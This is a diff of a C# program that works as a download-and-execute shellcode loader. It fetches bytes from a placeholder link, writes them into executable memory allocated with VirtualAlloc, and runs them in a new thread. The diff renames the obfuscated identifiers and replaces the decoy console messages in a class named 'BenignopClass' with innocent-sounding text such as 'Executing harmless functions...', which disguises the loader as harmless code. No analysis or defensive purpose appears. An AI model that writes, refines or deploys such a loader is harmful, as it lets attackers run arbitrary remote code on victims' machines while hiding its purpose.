@@ -1,38 +1,34 @@
 using System;
 using System.Net;
-using System.Reflection;
 using System.Runtime.InteropServices;
 
 class Program
 {
     static void Main(string[] args)
     {
-        // Replace [DOWNLOAD_LINK] with an actual download link
-        string downloadLink = "[DOWNLOAD_LINK]";
+        string downloadLink = "[YOUR_DOWNLOAD_LINK]";
 
         WebClient wc = new WebClient();
-        byte[] sfhbsgjhgjghhbsjbvejs = wc.DownloadData(downloadLink);
+        byte[] payload = wc.DownloadData(downloadLink);
 
         IntPtr addr = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
         VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(VirtualAllocDelegate));
-        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sfhbsgjhgjghhbsjbvejs.Length, 0x3000, 0x40);
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
 
-        Marshal.Copy(sfhbsgjhgjghhbsjbvejs, 0, mem, sfhbsgjhgjghhbsjbvejs.Length);
+        Marshal.Copy(payload, 0, mem, payload.Length);
 
         IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
 
         WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-        dhdsfhbsgjhgjghhbsjbvejsfgdfg();
+        ExecuteOps();
     }
 
-    static void dhdsfhbsgjhgjghhbsjbvejsfgdfg()
+    static void ExecuteOps()
     {
-        // This method calls methods from BenignopClass
-        // Make sure these methods exist in BenignopClass
-        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg1();
-        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg2();
-        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg3();
+        BenignopClass.Op1();
+        BenignopClass.Op2();
+        BenignopClass.Op3();
     }
 
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -52,18 +48,18 @@ class Program
 
 class BenignopClass
 {
-    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg1()
+    public static void Op1()
     {
-        Console.WriteLine("khan op.");
+        Console.WriteLine("Initializing benign operations...");
     }
 
-    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg2()
+    public static void Op2()
     {
-        Console.WriteLine("khan khan.");
+        Console.WriteLine("Executing harmless functions...");
     }
 
-    public static void mddhdsfhbsgjhgjghhbsjbvejsfgdfg3()
+    public static void Op3()
     {
-        Console.WriteLine("bfjdsfkhansfhbdshfdsYet d khan.");
+        Console.WriteLine("Completing routine tasks...");
     }
 }
